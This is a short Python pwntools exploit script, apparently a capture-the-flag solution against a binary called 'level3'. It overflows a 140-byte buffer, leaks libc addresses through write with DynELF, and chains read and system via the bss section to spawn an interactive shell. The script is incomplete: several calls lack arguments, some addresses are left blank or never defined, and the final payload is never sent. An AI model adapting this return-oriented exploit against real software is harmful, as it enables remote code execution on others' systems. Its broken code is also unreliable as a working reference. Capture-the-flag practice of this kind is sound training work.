from pwn import *
p=remote()
elf=ELF('./level3')
read_plt=
write_plt=
main_addr=
def leak(addr):
	payload='a'*140+p32(write_addr)+p32(main_addr)+p32(1)+p32(addr)+p32(4)
	p.sendlineafter()
	data=p.recv()
	return data
d=DynELF(leak,elf)
sys_addr=d.lookup('__libc_system','libc')
log.success()
bss_addr=elf.bss()
log.success('bss'+hex(bss_addr))
payload=p32(read_addr)+p32(sys_addr)+p32(0)+p32(bss_addr)+p32(8)+p32(ret)+p32(bss_addr)
p.sendlineafter()
p.interactive()
